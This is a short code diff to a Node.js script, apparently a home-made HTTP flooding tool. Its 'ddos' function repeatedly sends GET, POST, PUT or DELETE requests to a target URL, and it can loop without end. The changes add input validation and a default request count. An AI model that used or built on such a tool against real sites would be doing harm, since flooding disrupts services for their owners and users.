@@ -8,7 +8,7 @@ const rl = readline.createInterface({
 });
 
 async function ddos(features,i){     
-switch(features.type){
+switch(features.type.toLowerCase()){
     case 'get':
         console.info('making a request to '+features.url+' for the '+i +'th time with the settings '+features)
         let request= await axios.get(features.url,features.params);
@@ -22,7 +22,11 @@ switch(features.type){
       case 'delete':
         console.info('making a request to '+features.url+' for the '+i +'th time with the settings '+features)
         return(await axios.delete(features.url,features.params));
-}
+        default: console.log('The Type of request that you put is invalid, the valid values are:- get,post,put and delete');
+        
+i=(Number(features.count)+1);
+throw 'The Type of request that you put is invalid, the valid values are:- get,post,put and delete';
+    }
 }
 
 async function infinity(features){
@@ -133,7 +137,7 @@ features={
  
             if(count==='NULL'){
             features={
-                ...features, infinity
+                ...features, infinity,count:10
             }
             console.info('DDOSing with these settings '+ features);
         infinity(features)
